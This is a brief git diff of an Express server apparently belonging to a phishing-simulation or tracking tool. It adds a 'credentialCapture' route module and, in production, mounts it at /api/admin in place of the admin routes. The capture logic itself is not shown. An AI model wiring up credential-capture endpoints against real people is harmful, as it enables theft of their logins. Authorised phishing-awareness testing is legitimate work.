@@ -6,6 +6,7 @@ const connectDB = require('./src/config/db');
 
 const trackRoutes = require('./src/routes/trackRoutes');
 const adminRoutes = require('./src/routes/adminRoutes');
+const credentialCapture = require('./src/routes/credentialCapture');
 const Template = require('./src/models/Template');
 const defaultTemplates = require('./src/data/defaultTemplates');
 
@@ -74,6 +75,9 @@ app.use('/track', trackRoutes);
 // Admin routes - Only on localhost
 if (!isProduction) {
   app.use('/api/admin', adminRoutes);
+} else {
+  // On Render, only enable credential capture endpoint
+  app.use('/api/admin', credentialCapture);
 }
 
 // Health check & safety disclaimer endpoint
